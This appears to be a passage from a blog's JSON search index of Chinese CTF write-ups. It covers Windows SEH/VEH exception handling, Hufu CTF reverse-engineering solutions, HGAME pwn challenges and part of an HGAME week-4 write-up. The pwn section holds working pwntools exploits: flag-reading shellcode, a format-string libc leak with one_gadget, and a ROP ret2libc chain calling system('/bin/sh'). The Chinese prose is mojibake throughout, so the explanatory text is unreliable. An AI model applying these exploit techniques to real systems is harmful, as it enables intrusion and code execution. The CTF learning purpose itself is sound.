TEBæ•°æ®ï¼Œ64ä½ç³»ç»Ÿä¸­åˆ™ä½¿ç”¨ gs å¯„å­˜å™¨ SEH çš„é“¾å¼ç»“æ„ â€‹ SEH ä»¥é“¾çš„å½¢å¼å­˜åœ¨ï¼Œå³é“¾è¡¨ï¼Œç»“æ„å¦‚å›¾æ‰€ç¤ºï¼š â€‹ SEH ä¼šåœ¨é“¾è¡¨çš„å¤´éƒ¨è¿›è¡Œå¼‚å¸¸å¤„ç†å‡½æ•°çš„å®‰è£…ä¸å¸è½½ TEB.NtTib.ExceptionList = FS:[0] ExceptionList æ˜¯ TIB ä¸­ä¸å¼‚å¸¸å¤„ç†æœ‰å…³çš„é¡¹ï¼ŒæŒ‡å‘ SEH é“¾ å®‰è£…ä¸å¸è½½ å®‰è£… push @MyHandler ;å¼‚å¸¸å¤„ç†ç¨‹åº push FS:[0] ï¼›SEH Linked Listå¤´ mov dword ptr fs:[0],esp ;æ·»åŠ é“¾è¡¨ å¸è½½ mov esp,dword ptr fs:[0] pop dword ptr fs:[0] â€‹ å®‰è£…ä¸å¸è½½ä¸€èˆ¬å‘ç”Ÿåœ¨å‡½æ•°å¼€å§‹ä¸ç»“æŸå¤„ VEH â€‹ å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼ŒVEH ä¼šåœ¨ SEH ä¹‹å‰æ‰§è¡Œï¼Œå¦‚æœ VEH æ— æ³•å¤„ç†è¿™ä¸€å¼‚å¸¸ï¼Œå°±ä¼šç”± SEH ç»§ç»­å¤„ç†å¼‚å¸¸ â€‹ å¯é€šè¿‡ AddVectorExceptionHandler è¿™ä¸ª API æ¥æ³¨å†Œå›è°ƒå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¯æŒ‡å®šå›è°ƒå‡½æ•°å®‰è£…ä¸å¸è½½æ˜¯åœ¨é“¾è¡¨å‰ç«¯è¿˜æ˜¯å°¾éƒ¨ â€‹ ä½œç”¨èŒƒå›´ä¸ºæ•´ä¸ªè¿›ç¨‹ï¼Œå¯æ•è·æ‰€æœ‰çº¿ç¨‹çš„å¼‚å¸¸ â€‹ æƒ³è¦è·å– VEH å¼‚å¸¸çš„å‡½æ•°åœ°å€åº”è¯¥å¯ä»¥çœ‹ç¨‹åºä¸­æ˜¯å¦ç”¨åˆ° AddVectorExceptionHandler è¿™ä¸ª APIï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¼‚å¸¸å¤„ç†å‡½æ•° ä¾‹å­ â€‹ minilctf re2 â€‹ è¿™é‡Œå­˜åœ¨ä¸¤ä¸ªè§¦å‘å¼‚å¸¸çš„ç‚¹ï¼Œä¸€ä¸ªæ˜¯è®¿é—®åˆ°äº†ä¸èƒ½è®¿é—®çš„å†…å­˜ï¼Œå¦ä¸€ä¸ªæ˜¯é™¤0å¼‚å¸¸ â€‹ åœ¨ main å‡½æ•°çš„å¼€å¤´å‘ç°å¼‚å¸¸å¤„ç†å‡½æ•°å®‰è£…çš„æ±‡ç¼–ä»£ç ï¼Œä½†è°ƒè¯•è¿‡ç¨‹ä¸­åœ¨ __except_handler4 ä¸‹æ–­ç‚¹ç¨‹åºå¹¶ä¸ä¼šåœä¸‹ï¼Œè¿™é‡Œçš„ __except_handler4 é‡Œçš„å‡½æ•°åº”è¯¥æ˜¯ç¼–è¯‘å™¨æ·»åŠ çš„ â€‹ åœ¨ TLS å‡½æ•°ä¸­å¯ä»¥å‘ç°æ³¨å†Œäº† VEH çš„å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œæ ¹æ® VEH ä¼šå…ˆäº SEH æ‰§è¡Œï¼Œåœ¨ Handler å‡½æ•°ä¸‹æ–­å°±èƒ½ä½¿æŒ‡å®šçš„å¼‚å¸¸è§¦å‘æ—¶åœä¸‹ â€‹ å½“ç„¶æœ‰å…³ Windows å¼‚å¸¸å¤„ç†çš„çŸ¥è¯†è¿˜æœ‰å¾ˆå¤šï¼Œæœ¬æ–‡æ²¡æœ‰æåˆ°ï¼Œå¾…å¡« å‚è€ƒèµ„æ–™ ã€ŠåŠ å¯†ä¸è§£å¯†ã€‹ ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹ SEHè¯¦è§£ AddVectoredExceptionHandler è·å–VEH SEH VCH UEFå¼‚å¸¸çš„å‡½æ•°åœ°å€ VEHåˆ†æ Windowsè°ƒè¯•è‰ºæœ¯â€”â€”ä»0å¼€å§‹çš„å¼‚å¸¸å¤„ç†ï¼ˆä¸‹ï¼‰","link":"/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"title":"2021æ•°å­—ä¸­å›½è™ç¬¦CTF Reé¢˜å¤ç°","text":"2021è™ç¬¦CTF Re 1.redemption_code åˆ†æï¼š â€‹ è¿™é¢˜çš„é‡ç‚¹åœ¨äºç†è§£éªŒè¯å…‘æ¢ç å‡½æ•° server_check_redemption_code çš„ç®—æ³• 123456789101112131415161718192021222324252627282930int server_check_redemption_code(char *str, char *input){ int len1 = strlen(str); int len2 = strlen(input); int tmp = len2; char s[14*256]={0}; int maxsize = tmp &lt;&lt; 10; s[input[0]] = 1; int i,j; int v4; for (i = 1; i &lt; tmp; ++i) { for (j = 0; j &lt; 256; ++j) { if (j != input[i]) s[256 * i + j] = s[256 * v4 + j]; else s[256 * i + j] = i + 1; } v4 = s[256 * v4 + input[i]]; } int v7 = 0,k; for (k = 0; k &lt; len1; ++k) { v7 = s[256 * v7 + str[k]]; //èƒ½åœ¨strä¸­æ‰¾åˆ°ä¸flag[i]ç›¸åŒçš„å­—ç¬¦å°±ç§»å‘ä¸‹ä¸€è¡Œç»§ç»­æ‰¾ if (v7 == tmp) //strä¸­åŒ…å«flagçš„å…¨éƒ¨å­—ç¬¦ return k - tmp + 1; // =7 } return -1;} â€‹ â€‹ ç”¨å›¾æ¥è§£é‡Šä¸€ä¸‹ â€‹ sæ•°ç»„ç›¸å½“äºä¸€ä¸ª14*256çš„äºŒç»´æ•°ç»„ï¼ˆè¾“å…¥é•¿åº¦å¾—æ˜¯14ï¼‰ï¼Œå‡½æ•°å†…åŒé‡å¾ªç¯ä»£è¡¨åœ¨ä»¥ flag[i] ä¸ºä¸‹æ ‡çš„åœ°æ–¹å­˜å‚¨å½“å‰çš„ i+1 å€¼ï¼ˆç¬¬å‡ ä¸ªå­—ç¬¦ï¼‰ str1[] = â€œNinja Must Die 3 Is A Cruel Game, So Hard For Meâ€ str2[] = â€œI Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.â€ â€‹ pre å‡½æ•°æ£€æµ‹ str1ï¼Œæ ¹æ®checkå‡½æ•°æœ€åçš„å¾ªç¯è¿”å›ç»“æœä¸èƒ½æ˜¯ -1ï¼Œç¡®å®š flag å­—ç¬¦ä¸²åœ¨ str1ä¸­ â€‹ æ£€æµ‹ str2 çš„æ—¶å€™å› ä¸ºè¿”å›å€¼è¦æ˜¯7ï¼Œæ‰€ä»¥ flag ç»“å°¾å­—ç¬¦æ˜¯ str2[20] = â€˜eâ€™ï¼Œflag = â€œNinja Must Dieâ€ éªŒè¯ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int server_check_redemption_code(char *str, char *input){ int len1 = strlen(str); int len2 = strlen(input); int tmp = len2; char s[14*256]={0}; int maxsize = tmp &lt;&lt; 10; s[input[0]] = 1; int i,j; int v4; for (i = 1; i &lt; tmp; ++i) { for (j = 0; j &lt; 256; ++j) { if (j != input[i]) s[256 * i + j] = s[256 * v4 + j]; else s[256 * i + j] = i + 1; } v4 = s[256 * v4 + input[i]]; } int v7 = 0,k; for (k = 0; k &lt; len1; ++k) { v7 = s[256 * v7 + str[k]]; if (v7 == tmp) return k - tmp + 1; // =7 } return -1;}int main(){ char str1[]=&quot;Ninja Must Die 3 Is A Cruel Game, So Hard For Me&quot;; char str2[]=&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;; char flag[]=&quot;Ninja Must Die&quot;; printf(&quot;%d&quot;,server_check_redemption_code(str1,flag)); printf(&quot;%d&quot;,server_check_redemption_code(str2,flag)); system(&quot;pause&quot;); return 0;} 2.GoEncrypt åˆ†æï¼š â€‹ go è¯­è¨€é€†å‘ï¼Œmain_main å‡½æ•°åæ±‡ç¼–åå¯ä»¥çœ‹åˆ°æœ‰ä¸ª main_check ï¼Œmain_NewCipher ï¼Œä¸¤ä¸ª Encrypt åŠ å¯†ï¼Œæœ€å internal_bytealg_Equal æ¯”è¾ƒ â€‹ check é‡Œé¢æœ‰ flag çš„æ ¼å¼ ^flag{([0-9a-f]{8})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{12})} â€‹ å¯ä»¥æ„é€  flag è¿›è¡Œè°ƒè¯• flag{abababab-abab-abab-abab-abababababab} â€‹ å›¾ä¸­çš„å‡½æ•°å°†è¾“å…¥è½¬ä¸º16è¿›åˆ¶ï¼Œå¦‚ 0xababababababababababababababababï¼Œä¹‹åå†åˆ†å‰²æˆ4ä¸ª16è¿›åˆ¶æ•° â€‹ åŠ å¯†çš„å‡½æ•°æ ¹æ®ç‰¹ç‚¹å¯ä»¥çŸ¥é“æ˜¯ XTEA åŠ å¯† â€‹ â€‹ è°ƒè¯•åˆ° encrypt å‡½æ•°æ—¶å¯ä»¥å‘ç°ä¸¤ä¸ª encrypt åˆ†åˆ«å¯¹ä¸¤ä¸ª4ä½çš„16è¿›åˆ¶æ•°è¿›è¡ŒåŠ å¯†ï¼Œå¯†é’¥å¦‚ä¸‹ â€‹ ä¹‹åå¯ä»¥åœ¨ internal_bytealg_Equal å‡½æ•°å†…æ‰¾åˆ° flag çš„å¯†æ–‡ â€‹ å‰é¢é‚£äº›çœ‹èµ·æ¥åƒæ˜¯æ±‡ç¼–ä»£ç çš„å®é™…è°ƒè¯•æ—¶å¹¶ä¸æ‰§è¡Œï¼Œå…³é”®åªåœ¨è¿™ä¸€éƒ¨åˆ† è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define uint32_t unsigned intvoid decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0 = v[0], v1 = v[1], delta = 0x12345678, sum = delta * num_rounds; for (i = 0; i &lt; num_rounds; i++) { v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); } v[0] = v0; v[1] = v1;}int main(){ //uint32_t v1[2]={0x0EC311F0,0x45C79AF3 }; uint32_t v[2] = { 0xedf5d910,0x542702cb}; uint32_t const k[4] = { 0x10203,0x4050607,0x8090a0b,0xc0d0e0f }; unsigned int r = 32;//num_roundså»ºè®®å–å€¼ä¸º32 // vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½ decipher(r, v, k); printf(&quot;è§£å¯†åçš„æ•°æ®ï¼š0x%x 0x%x\\n&quot;, v[0], v[1]); return 0;} 3.Crackme â€‹ åæ±‡ç¼–å‡ºæ¥ 500 å¤šè¡Œï¼Œè¦è°ƒè¯•åäº†ã€‚ã€‚ã€‚ åˆ†æï¼š â€‹ å…ˆæ˜¯è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º17çš„å­—ç¬¦ä¸²ï¼Œç„¶åè¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œå¯¹è¾“å…¥çš„æ•°å­—è¿›è¡Œè¿ç®—åå†åˆ¤æ–­ â€‹ â€‹ è™½ç„¶è¿™ä¸ªå‡½æ•° ida æç¤ºè¯´ç»“æœå¯èƒ½é”™è¯¯ï¼Œä½†æ˜¯å®é™…è¿ç®—è·Ÿåæ±‡ç¼–å‡ºæ¥çš„æ˜¯ä¸€æ ·çš„ï¼ˆæ¯”èµ›å½“å¤©å› ä¸ºè¿™ä¸ªå¡äº†å¥½ä¹…ï¼Œä¸€ç›´åœ¨è¯•å›¾è°ƒè¯•å‡ºæ­£ç¡®çš„è¿ç®—è¿‡ç¨‹ï¼‰ â€‹ æƒ³è¦å¾—åˆ°è¿™ä¸ªæ•°å­—å¯ä»¥é‡‡å–çˆ†ç ´çš„æ–¹æ³•ï¼Œå¤šæ¬¡è¾“å…¥å¹¶è°ƒè¯•æ¥ç¼©å°èŒƒå›´ â€‹ ä¹‹åæŠŠç¬¬ä¸€ä¸ªè¾“å…¥çš„å­—ç¬¦ä¸²åˆ†ä¸ºå‰7ä¸ªå’Œå10ä¸ªï¼Œåˆ†åˆ«å¼‚æˆ–åŠ å¯† è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;#include&lt;math.h&gt;double cal(double a1,double a2){ double temp = pow(a1, a2 - 1.0); double result = temp / exp(a1); return result;}int main(){ int v94 = 0.0; for(v94=90000;v94&lt;100000000;v94++) { double v15 = 0.0; double v16 = 0.0; double v17 = 0.0; double v18 = (double)((int)v94 / 12379) + 1.0; do { v16 = v16 + cal(v17, v18) * 0.001; v17 = v17 + 0.001; } while ( v17 &lt;= 100.0 ); double v19 = (int)(v16 + v16 + 3.0); double v20 = 0.0; double v21 = (double)(v94 % 12379) + 1.0; do { v15 = v15 + cal(v20, v21) * 0.001; v20 = v20 + 0.001; } while ( v20 &lt;= 100.0 ); if(v19 == 0x13b03 &amp;&amp; (int)(v15 + v15 + 3.0) == 0x5a2) { printf(&quot;%d&quot;,v94); break; } } system(&quot;pause&quot;); return 0;}//99038 123456789101112131415161718192021a7 = [0x08, 0x4D, 0x59, 0x06, 0x73, 0x02, 0x40]number = &quot;99038198076198076198076198076198076&quot;#è¾“å…¥æ•°å­—ä¹˜2æ¥åˆ°åé¢k = [0xe0,0x95,0xba,0x60,0xc9,0x66,0x2a,0x24,0xb2,0x36]a10 = [0xB2, 0xD6, 0x8E, 0x3F, 0xAA, 0x14, 0x53, 0x54, 0xC6, 0x06]flag = []for i in range(7): c = chr(a7[i] ^ ord(number[i])) flag.append(c)flag1 = ''.join(flag)print(flag1)#1ti5K3yfor i in range(10): d = chr(k[i] ^ a10[i]) flag.append(d)flag_last = ''.join(flag)print(flag_last)#1ti5K3yRC4_crypt0#åé¢é‚£ä¸ªåŸæ¥æ˜¯RC4å—","link":"/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"title":"HGAME  Pwn é¢˜å­¦ä¹ ","text":"Hgame Pwné¢˜ 1.letter æ‰€éœ€çŸ¥è¯†ï¼š â€‹ è®¡ç®—æœºä¸­æœ‰ç¬¦å·æ•°ç”¨è¡¥ç æ¥è¡¨ç¤ºï¼ˆç”¨åŸç æˆ–åç è¡¨ç¤ºéƒ½ä¼šå‡ºç°é‡å¤çš„0ï¼‰ï¼Œæ­£æ•°çš„è¡¥ç æ˜¯æ•°æœ¬èº«ï¼Œè´Ÿæ•°çš„è¡¥ç æ˜¯åŸç æŒ‰ä½å–ååŠ  1 ï¼Œè´Ÿæ•°è¡¥ç å–ååŠ  1 æ˜¯å…¶ç»å¯¹å€¼ é¢˜è§£ï¼š â€‹ é¢˜ç›®ä¸­æ²¡æœ‰ system() æ¥ getshellï¼Œå‚è€ƒå®˜æ–¹ writeup çŸ¥é“æ²¡å¼€ NXä¿æŠ¤å°±å¯ä»¥åœ¨å †æ ˆä¸Šå†™å…¥ shellcode å¹¶æ‰§è¡Œ â€‹ è¾“å…¥æœ‰ä¸ªé•¿åº¦åˆ¤æ–­ï¼Œæ ¹æ®æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°å¯ä»¥ -1 ç»•è¿‡ â€‹ å› ä¸ºè¦åœ¨æ ˆä¸Šæ‰§è¡Œä»£ç æ‰€ä»¥éœ€è¦ jmp rsp ï¼Œç”¨ ROPgadget æŸ¥ä¸€ä¸‹ ROPgadget --binary ./letter | grep â€œjmp rspâ€ â€‹ æ²¡å‘ç°æœ‰ jmp rsp ï¼Œçœ‹äº†ä¸€ä¸‹ writeup å°è¯•ç”¨è¾“å…¥çš„è´Ÿæ•°æ„é€  jmp rspï¼Œç”¨ ida æŸ¥çœ‹æœºå™¨ç ä¸º FF E4ï¼ˆFF E4å°±æ˜¯å†…å­˜ä¸­çš„é¡ºåºï¼‰ï¼Œint ä¸ºå››å­—èŠ‚æ‰€ä»¥æ„é€  F0 00 E4 FF çš„è´Ÿæ•° -268376833 ï¼ˆæœ€é«˜ä½æ˜¯ 1 ï¼Œç„¶åè½¬ä¸ºæ— ç¬¦å·æ•°ç¨å¾®å¤§ç‚¹çš„å¤§æ¦‚éƒ½è¡Œå§ã€‚ã€‚ã€‚ï¼Œä½†æ˜¯æˆ‘ç”¨ FF 00 E4 FF çš„æ—¶å€™å¶å°”ä¼šå‡ºé”™ï¼‰ â€‹ è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¨‹åºåˆ©ç”¨æ²™ç®±åªå…è®¸ä½¿ç”¨éƒ¨åˆ†ç³»ç»Ÿè°ƒç”¨ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç™½åå•çš„æ„æ€ï¼Œå¯ä»¥æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·æŸ¥å¾—åªå…è®¸ä½¿ç”¨ open ï¼Œread ï¼Œwriteï¼Œæˆ–è€…ç”¨ seccomp-tools ç›´æ¥çœ‹å¼€äº†ä»€ä¹ˆã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°±ç”¨è¿™å‡ ä¸ªç³»ç»Ÿè°ƒç”¨æ¥æ‰“å¼€å¹¶è¯»å– flag æ–‡ä»¶å†…å®¹ â€‹ ä¸‹é¢æ˜¯ exp 123456789101112131415161718192021from pwn import *context.arch = 'amd64'context.log_level = 'debug'r = process('./letter')r.sendlineafter('?','-268376833')#ç¨‹åºæ˜¯ amd64 çš„shellcode = shellcraft.amd64.open('./flag')shellcode += shellcraft.amd64.read('rax','rsp',0x30)shellcode += shellcraft.amd64.write(1,'rsp',0x30)r.sendline('a'*0x18+p64(0x60108C)+asm(shellcode))r.interactive() â€‹ æœ¬åœ°å¤ç°ç»“æœ 2.once æ‰€éœ€çŸ¥è¯†ï¼š 32ä½ç¨‹åºä¸­çš„ printf å‡½æ•°é€†åºä¼ å‚ï¼Œå‚æ•°éƒ½å­˜æ”¾åœ¨æ ˆä¸Š 64ä½ç¨‹åºä¸­çš„ printf å‡½æ•°ä¹Ÿæ˜¯é€†åºä¼ å‚ï¼Œå‰ 6 ä¸ªå‚æ•°ï¼ˆä»å³åˆ°å·¦ï¼‰å­˜æ”¾åœ¨å¯„å­˜å™¨ä¸­ï¼Œä¾æ¬¡ä¸º RDIã€RSIã€RDXã€ RCXã€ R8ä»¥åŠR9 ï¼Œå…¶ä»–å¤šçš„å‚æ•°å­˜åœ¨æ ˆä¸Š é¢˜è§£ï¼š â€‹ å…ˆç”¨ checksec æŸ¥ä¸€ä¸‹ï¼Œå¼€å¯äº† PIE ä¿æŠ¤ â€‹ ida åç¼–è¯‘å‘ç° â€‹ æ²¡æœ‰ç›´æ¥çš„ system æˆ– execve æ¥ getshellï¼Œä½† vuln å‡½æ•°é‡Œæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ printf ï¼Œé¢˜ç›®ä¸­ä¹Ÿç»™äº† libcç‰ˆæœ¬ï¼Œå¯ä»¥ leak å‡º libc åŸºå€å†åŠ ä¸Š one_gadget æ¥ getshell â€‹ Constraints æ„æ€æ˜¯é™åˆ¶æ¡ä»¶ï¼Œä¸æ»¡è¶³æ¡ä»¶çš„æ²¡æ³•ç”¨ â€‹ ä¸‹é¢æ˜¯ exp 1234567891011121314151617181920212223242526from pwn import *libc = ELF('./libc-2.27.so')r = process('./once')context.log_level = 'debug'pay1 = '%13$p\\n' #64ä½printfå‡½æ•°pay1 = pay1.ljust(0x28,'a') #è¡¥é½åˆ° 0x28pay1 += '\\xD3'r.sendafter('turn: ',pay1)addr = r.recvuntil('\\n')addr = addr.strip('\\n')addr = int(addr,16) #intå‡½æ•°æœ‰ç¬¬äºŒä¸ªå‚æ•°é‚£ç¬¬ä¸€ä¸ªå‚æ•°è¦æ˜¯å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºè¾“å…¥çš„è¿›åˆ¶æ•°libcbase = addr - 231 -libc.symbols['__libc_start_main']pay2 = 'a' * 0x28 + p64(libcbase + 0x4f3d5)r.sendlineafter('turn: ',pay2)r.interactive() â€‹ â€‹ å¼€å¯äº† pie éšæœºåŒ–ï¼Œä½†å› ä¸ºå†…å­˜åˆ†é¡µåˆ¶åº¦ï¼ˆå¥½åƒæ˜¯è¿™ä¸ªï¼‰åœ°å€çš„æœ€ä½12ä½æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å¯ä»¥è¦†ç›–è¿”å›åœ°å€æœ€ä½ä½çš„ä¸€ä¸ªå­—èŠ‚æ¥å›åˆ° vuln å‡½æ•°å¼€å¤´ â€‹ å…³äºä¸ºä»€ä¹ˆæ˜¯ D3 è€Œä¸æ˜¯ D2 æˆ‘è¿˜æ²¡å¼„æ˜ç™½ï¼Œæ­¤å¤„å¾…å¡« â€‹ è¿˜æœ‰ libc_start_main åœ°å€æ³„éœ²çš„ %13$pï¼ˆè¾“å‡ºç¬¬13ä¸ªå‚æ•°ï¼‰ è¦æ ¹æ® printf å‡½æ•°çš„è°ƒç”¨çº¦å®šæ¥è®¡ç®— â€‹ 64ä½çš„ç¨‹åºï¼Œæ‰€ä»¥è¦åŠ ä¸Š 6 å¾—åˆ° 13 â€‹ ï¼ˆpwné¢˜æˆ‘è§‰å¾—æœ€å¥½è¿˜æ˜¯ç”¨ unbuntu æ¥åšï¼Œç”¨ kali æ€ä¹ˆéƒ½æˆåŠŸä¸äº†ï¼ŒæŸ¥çœ‹æ ˆä¸Šçš„å†…å®¹ä¹Ÿä¸å¤ªä¸€æ ·5ï¼Œå¡äº†åŠå¤©ï¼‰ 3.rop_primary æ‰€éœ€çŸ¥è¯†ï¼š â€‹ **rop å­¦ä¹ ï¼š**https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc â€‹ å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼š â€‹ å‡½æ•°ç­‰åˆ°ç”¨åˆ°æ—¶æ‰è¿›è¡Œç»‘å®šï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ got è¡¨é‡Œä¿å­˜çš„æ˜¯ pltè¡¨ push XX çš„åœ°å€ï¼Œç„¶å _ dll_runtime_resolve () å‡½æ•°ä¼šå» libc åº“é‡Œæ‰¾åˆ°å‡½æ•°çœŸæ­£çš„åœ°å€å†™åˆ° got è¡¨é‡Œ â€‹ â€‹ x86 ä¸ x64 ROPåŒºåˆ«ï¼ˆvidar åŸ¹è®­çš„å›¾ï¼‰ï¼š é¢˜è§£ï¼š â€‹ â€‹ å¼€äº† NX ä¿æŠ¤ï¼Œé‚£å°±æ˜¯ rop ç»•è¿‡ï¼Œida f5 å¯ä»¥çœ‹åˆ°æœ‰é€šè¿‡å‘½ä»¤è¡Œå‚æ•°ï¼ˆargv[1]ï¼‰æ‰“å¼€çš„æ–‡ä»¶ï¼Œä¹‹ååœ¨æ–‡ä»¶é‡Œè¯»å–ä¸‰ä¸ªçŸ©é˜µï¼Œæœ¬åœ°è°ƒè¯•çš„è¯å¯ä»¥æ„é€ ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶ã€‚check å‡½æ•°æ£€æµ‹çŸ©é˜µ aï¼Œb è¿›è¡Œä¹˜æ³•è¿ç®—çš„ç»“æœä¸ c çŸ©é˜µæ¯”è¾ƒ â€‹ vuln å‡½æ•°å¯ä»¥æº¢å‡ºï¼Œæ²¡æœ‰ system å’Œ /bin/shï¼Œé‚£å°±éœ€è¦é€šè¿‡ read å‡½æ•°æ³„éœ² libc ç‰ˆæœ¬è·å¾— â€‹ ä¸‹é¢æ˜¯ expï¼ˆå› ä¸ºè‡ªå·±å†™çš„ exp ä¸å°å¿ƒåˆ æ‰äº†ï¼Œæ‰€ä»¥å‰é¢çŸ©é˜µè¿ç®—å€Ÿé‰´äº†å®˜æ–¹ writeup çš„ï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *from LibcSearcher import *def read_martix(): matrix = [] while True: line = r.recvuntil('\\n').strip() if '\\t' not in line: break row = [] for num in line.split('\\t'): row.append(int(num)) matrix.append(row) return matrix def multi(a, b): rows = len(a) mid = len(b) cols = len(b[0]) martixC = [] for i in range(rows): row = [] for j in range(cols): num = 0 for k in range(mid): num += a[i][k] * b[k][j] row.append(num) martixC.append(row) return martixCcontext.log_level = 'debug'context.arch = 'amd64'elf = ELF('./rop_primary')r = elf.process(argv = ['martix']) #æ·»åŠ å‘½ä»¤è¡Œå‚æ•°r.recvuntil('A:\\n')martixA = read_martix()martixB = read_martix()martixC = multi(martixA,martixB)for row in martixC: for n in row: r.sendline(str(n))poprdi = 0x401613 #ç”¨ ROPgadget è·å– poprdi ; ret åœ°å€ret = 0x40101a again = 0x40157Cpay = 'a'*0x38 + p64(poprdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])pay += p64(again)r.sendlineafter('best\\n',pay)#leakå¹¶è®¡ç®—åŸºå€leak_addr = u64(r.recv(6).ljust(8,'\\x00'))libc = LibcSearcher('puts',leak_addr)libcbase = leak_addr - libc.dump('puts')binsh = libcbase + libc.dump('str_bin_sh') system = libcbase + libc.dump('system')#getshellpay2 = 'a'*0x38 + p64(poprdi) +p64(binsh) + p64(system)r.sendlineafter('best\\n',pay2)r.interactive()","link":"/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/"},{"title":"HGAME-Week4-Writeup","text":"week4 Re 1.vm â€‹ è¿™éƒ¨åˆ†é€»è¾‘å¾ˆæ¸…æ™°ï¼Œé‡ç‚¹åœ¨ä¸­é—´è¿™ä¸ªåŠ å¯†çš„éƒ¨åˆ†ï¼Œç‚¹è¿›å»æŸ¥çœ‹è¿™ä¸ªå‡½æ•°å‘ç° switch-case åº”è¯¥æ˜¯vmï¼Œæ¯ä¸ªcaseéƒ½æ˜¯ä¸€ä¸ª opcode â€‹ é¢˜ç›®é‡Œè¯´ ovm++ hates debugger ï¼Œé‚£å°±å…ˆè°ƒè¯•ä¸€ä¸‹ï¼Œè°ƒè¯•åå¯ä»¥çŒœæµ‹å‡ºå…·ä½“çš„åŠ å¯†éƒ¨åˆ† â€‹ è¾“å…¥çš„ flag å…ˆæ˜¯ç»è¿‡å¼‚æˆ–åŠ å¯†ï¼Œä¹‹ååˆæœ‰å‡æ³•æ“ä½œï¼ŒåŠ å¯†åä¸å¯†æ–‡è¿›è¡Œæ¯”è¾ƒï¼Œå†™è„šæœ¬è§£ä¸€ä¸‹å°±èƒ½å¾—åˆ° flag 12345678910111213cipher = [0xcf,0xbf,0x80,0x3b,0xf6,0xaf,0x7e,0x02,0x24,0xed,0x70,0x3a,0xf4,0xeb,0x7a,0x4a,0xe7,0xf7,0xa2,0x67,0x17,0xf0,0xc6,0x76,0x36,0xe8,0xad,0x82,0x2e,0xdb,0xb7,0x4f,0xe6,0x09]table1 = [0xFE,0x21,0x44,0x67,0x8A,0xAD,0xD0,0xF3,0x16,0x39,0x5c,0x7f,0xa2,0xc5,0xe8,0x0b,0x2e,0x51,0x74,0x97,0xba,0xdd,0x00,0x23,0x46,0x69,0x8c,0xaf,0xd2,0xf5,0x18,0x3b,0x5e,0x81]table2 = [0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a]for i in range(34): if cipher[i] + table2[33-i] &lt; 256: cipher[i] += table2[33-i] else: cipher[i] = cipher[i] + table2[33-i] - 256for i in range(34): cipher[i] ^= table1[33-i] print(chr(cipher[i]),end = &quot;&quot;) â€‹ è¿™é“é¢˜æ ‡å‡†è§£æ³•åº”è¯¥ä¸æ˜¯è¿™æ ·è§£çš„ï¼Œè€Œæ˜¯è¦å…ˆè¦ç¿»è¯‘å‡ºå¯¹åº”çš„æ±‡ç¼–ä»£ç å†åˆ†æï¼Œä½†è¿™éƒ¨åˆ†æˆ‘è¿˜ä¸å¤ªæ˜ç™½ä¹‹åå†è¡¥ä¸Šå§ 2.A 5 Second Challenge â€‹ è¿™é¢˜è¦æ„Ÿè°¢å°åœ†å­¦é•¿çš„è€å¿ƒå›ç­”!! â€‹ ä¸‹è½½å¾—åˆ°çš„æ˜¯ç”¨unityåˆ¶ä½œçš„æ‰«é›·æ¸¸æˆï¼Œåˆšå¼€å§‹ä¸ºäº†è·å¾—æºç ç”¨ il2cppdumper å¤„ç† GameAssembly.dll 